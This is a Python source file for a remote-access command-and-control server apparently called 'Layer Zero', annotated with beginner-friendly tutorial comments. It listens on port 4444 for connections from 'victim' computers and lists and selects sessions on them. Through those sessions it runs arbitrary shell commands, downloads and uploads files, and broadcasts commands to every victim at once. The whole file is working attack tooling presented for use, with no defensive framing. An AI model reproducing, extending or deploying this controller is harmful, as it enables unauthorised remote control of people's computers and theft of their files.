# ============================================================================================
# LIBRARY IMPORTS - These are tools other programmers created that we can use
# ============================================================================================
# Think of libraries like toolboxes - they give us ready-made tools so we don't have to
# build everything from scratch!

import socket    # Allows our program to communicate over the internet/network
import json      # Helps us organize data in a format that's easy to send and receive
import base64    # Converts files into text format so we can send them over the network
import threading # Lets our program do multiple things at once (like listening for connections while also accepting commands)


# ============================================================================================
# COLOR CODES - These make our terminal output colorful!
# ============================================================================================
# ANSI escape codes let us add colors to text in the terminal
# They work by sending special character sequences that tell the terminal to change color

GREEN = '\033[92m'   # Green color - for success messages and banner
YELLOW = '\033[93m'  # Yellow color - for informational messages
RED = '\033[91m'     # Red color - for error messages
RESET = '\033[0m'    # Reset to default color - always use this after colored text!


# ============================================================================================
# BANNER - This is the cool ASCII art that displays when the program starts
# ============================================================================================
# The 'r' before the quotes tells Python: "treat all backslashes as regular characters"
# Without the 'r', Python would think the backslashes mean something special and mess up our art!

BANNER = r''' 
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
'''


# ============================================================================================
# HELP MENUS - Display available commands to the user
# ============================================================================================

def show_center_help():
    """Display help menu for the main command center"""
    print(YELLOW + "\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                    COMMAND CENTER - HELP MENU                    ║")
    print("╚══════════════════════════════════════════════════════════════════╝" + RESET)
    print(GREEN + "\nAvailable Commands:" + RESET)
    print(YELLOW + "  targets" + RESET + "         - List all connected victim computers")
    print(YELLOW + "  session <#>" + RESET + "     - Connect to a specific victim (e.g., 'session 0')")
    print(YELLOW + "  sendall <cmd>" + RESET + "   - Send a command to ALL victims at once")
    print(YELLOW + "  help" + RESET + "            - Show this help menu")
    print(YELLOW + "  quit" + RESET + "            - Close all connections and exit the program\n")

def show_shell_help():
    """Display help menu for the victim shell"""
    print(YELLOW + "\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                      VICTIM SHELL - HELP MENU                    ║")
    print("╚══════════════════════════════════════════════════════════════════╝" + RESET)
    print(GREEN + "\nAvailable Commands:" + RESET)
    print(YELLOW + "  <any command>" + RESET + "   - Run any system command (e.g., 'ls', 'pwd', 'whoami')")
    print(YELLOW + "  cd <path>" + RESET + "       - Change directory on the victim computer")
    print(YELLOW + "  download <file>" + RESET + " - Download a file from the victim to your computer")
    print(YELLOW + "  upload <file>" + RESET + "   - Upload a file from your computer to the victim")
    print(YELLOW + "  help" + RESET + "            - Show this help menu")
    print(YELLOW + "  exit" + RESET + "            - Exit victim shell and return to Command Center\n")


# ============================================================================================
# FUNCTION: sendtoall
# ============================================================================================
# PURPOSE: Send the same message to all connected victim computers at once
# 
# HOW IT WORKS:
# 1. Takes your message and converts it to JSON (a format computers like to use)
# 2. Goes through each connected victim one by one
# 3. Sends the message to each victim

def sendtoall(targets, data):
    json_data = json.dumps(data)                    # Step 1: Convert data to JSON format (like packaging it for shipping)
    for target in targets:                          # Step 2: Loop through each victim computer in our list
        target.send(json_data.encode('utf-8'))      # Step 3: Send the packaged data to this victim


# ============================================================================================
# FUNCTION: run
# ============================================================================================
# PURPOSE: This lets you control a single victim computer - send commands and get results
# 
# THINK OF IT LIKE: Having a remote control for someone else's computer!
# You can type commands like "ls" or "pwd" and see what happens on their computer

def run(target, ip):
    
    # ------------------
    # Mini-function inside run: send
    # ------------------
    # Sends a message to the victim computer
    def send(data):
        json_data = json.dumps(data)                # Package the data in JSON format
        target.send(json_data.encode('utf-8'))      # Convert to bytes and send it over the network

    # ------------------
    # Mini-function inside run: recieve
    # ------------------
    # Receives a message from the victim computer
    # Sometimes messages come in pieces, so we keep collecting until we have the complete message
    def recieve():
        json_data = ''                                      # Start with an empty message
        while True:                                         # Keep trying until we get a complete message
            try:
                json_data += target.recv(1024).decode('utf-8')  # Receive up to 1024 bytes and add to our message
                return json.loads(json_data)                    # Try to convert from JSON - if it works, we're done!
            except ValueError:                                  # If JSON conversion fails, message is incomplete
                continue                                        # Keep looping to get more data

    # ------------------
    # Main interaction loop
    # ------------------
    # This is where you type commands and see the results!
    while True:
        command = input('Shell#: ')                         # Show prompt and wait for you to type a command
        
        if command == 'help':                               # If you typed 'help'
            show_shell_help()                               # Display the shell help menu
            continue                                        # Don't send 'help' to the victim, just show menu
        
        send(command)                                       # Send your command to the victim computer
        
        if command == 'exit':                               # If you typed 'exit'
            break                                           # Stop controlling this victim and go back to main menu
        
        elif command[:2] == 'cd' and len(command) > 1:      # If you typed 'cd' (change directory)
            continue                                        # cd doesn't give output, so just continue to next command
        
        elif command[:8] == 'download':                     # If you typed 'download filename'
            with open(command[9:], 'wb') as file:           # Create a new file on YOUR computer (the filename you specified)
                file_data = recieve()                       # Get the file data from the victim
                file.write(base64.b64decode(file_data))     # Decode the data and save it to your file
        
        elif command[:6] == 'upload':                       # If you typed 'upload filename'
            with open(command[7:], 'rb') as file:           # Open the file from YOUR computer
                send(base64.b64encode(file.read()).decode('utf-8'))  # Read it, encode it, and send to victim
        
        else:                                               # For any other command (like 'ls', 'whoami', etc.)
            result = recieve().encode('utf-8')              # Get the command output from the victim
            print(result.decode('utf-8'))                   # Display the output on your screen


# ============================================================================================
# FUNCTION: server
# ============================================================================================
# PURPOSE: This function runs in the background, constantly watching for new victim computers
#          trying to connect to us
# 
# THINK OF IT LIKE: A bouncer at a club door - always watching for new people trying to get in!
# 
# WHY IT RUNS IN BACKGROUND: We need to accept new connections while ALSO letting you type
#                            commands. Threading lets us do both at the same time!

def server():
    global clients                                          # We need to access the 'clients' variable from outside this function
    
    while True:                                             # Keep watching for new connections forever
        if stop_server:                                     # Check if we need to shut down
            break                                           # If yes, stop the loop and exit
        
        sock.settimeout(1)                                  # Only wait 1 second for a connection before checking stop_server again
        
        try:
            target, ip = sock.accept()                      # Wait for a victim to connect (this pauses here until someone connects)
            targets.append(target)                          # Add this victim's connection to our list
            ips.append(ip)                                  # Add this victim's IP address to our list
            print(GREEN + str(targets[clients]) + '--' + str(ips[clients]) + ' has connected' + RESET)  # Success message in GREEN!
            clients += 1                                    # Count how many victims we have
            
        except:                                             # If no one connected in that 1 second
            pass                                            # Just continue the loop (no big deal)


# ============================================================================================
# MAIN PROGRAM SETUP
# ============================================================================================
# This is where we set everything up before the program actually starts running

global sock                                                 # Make 'sock' available everywhere in our program
ips = []                                                    # Empty list - we'll add victim IP addresses here as they connect
targets = []                                                # Empty list - we'll add victim connections here as they connect

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # Create a socket (think of it as a phone line for computers)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow us to reuse the same port if we restart the program quickly
sock.bind(('0.0.0.0', 4444))                                # Listen on ALL network interfaces on port 4444
                                                            # 0.0.0.0 means "accept connections from anywhere"
                                                            # 4444 is the "phone number" victims will call
sock.listen()                                               # Start listening for incoming connections

clients = 0                                                 # Counter: how many victims have connected so far? (starts at 0)
stop_server = False                                         # Flag: should the background server stop? (starts as False)

print(GREEN + BANNER + RESET)                               # Show our cool ASCII art banner in GREEN
print(YELLOW + '[+] Waiting for targets to connect...' + RESET)  # Informational message in YELLOW
print(YELLOW + "[+] Type 'help' for a list of available commands" + RESET)  # Hint for new users

thread = threading.Thread(target=server)                    # Create a background worker that will run the 'server' function
thread.start()                                              # Start that background worker (now it's watching for connections!)

# ============================================================================================
# MAIN COMMAND CENTER
# ============================================================================================
# This is the main control panel! You can type commands here to manage your connected victims
#
# AVAILABLE COMMANDS:
#   - targets       : See all connected victims
#   - session #     : Control a specific victim (replace # with their session number)
#   - sendall       : Send a command to ALL victims at once
#   - help          : Display the help menu
#   - quit          : Close everything and exit the program

while True:                                                 # Keep showing the command prompt forever (until we quit)
    command = input('*Center: ')                            # Show prompt and wait for you to type a command
    
    # ------------------
    # COMMAND: targets
    # ------------------
    # Shows you a list of all victims that are connected
    if command == 'targets':
        count = 0                                           # Start counting from 0
        for ip in ips:                                      # Go through each victim's IP address
            print(YELLOW + 'Session ' + str(count) + '-----' + str(ip) + RESET)  # Informational message in YELLOW
            count += 1                                      # Move to the next number
    
    # ------------------
    # COMMAND: help
    # ------------------
    # Shows the help menu with all available commands
    elif command == 'help':
        show_center_help()                                  # Display the command center help menu
    
    # ------------------
    # COMMAND: session #
    # ------------------
    # Lets you control a specific victim (like 'session 0' or 'session 1')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])                          # Get the number you typed (the part after 'session ')
            tarnum = targets[num]                           # Get that victim's connection
            tarip = ips[num]                                # Get that victim's IP
            run(tarnum, tarip)                              # Start controlling that victim!
        except:                                             # If something went wrong (bad number, victim doesn't exist, etc.)
            print(RED + '[-] Invalid session' + RESET)      # Error message in RED
    
    # ------------------
    # COMMAND: quit
    # ------------------
    # Shuts down everything cleanly and exits the program
    elif command == 'quit':
        for target in targets:                              # Go through each connected victim
            target.close()                                  # Disconnect from them nicely
        sock.close()                                        # Close our main listening socket
        stop_server = True                                  # Tell the background server to stop
        thread.join()                                       # Wait for the background server to finish
        break                                               # Exit this loop (which ends the program)
    
    # ------------------
    # COMMAND: sendall
    # ------------------
    # Sends the same command to ALL victims at once
    elif command[:7] == 'sendall':
        try:
            sendtoall(targets, command)                     # Send command to everyone
        except:                                             # If sending failed for some reason
            print(RED + '[!] Send to all failed' + RESET)   # Error message in RED
    
    # ------------------
    # UNKNOWN COMMAND
    # ------------------
    # If you typed something we don't recognize
    else:
        print(RED + '[!!!] Invalid command' + RESET)        # Error message in RED
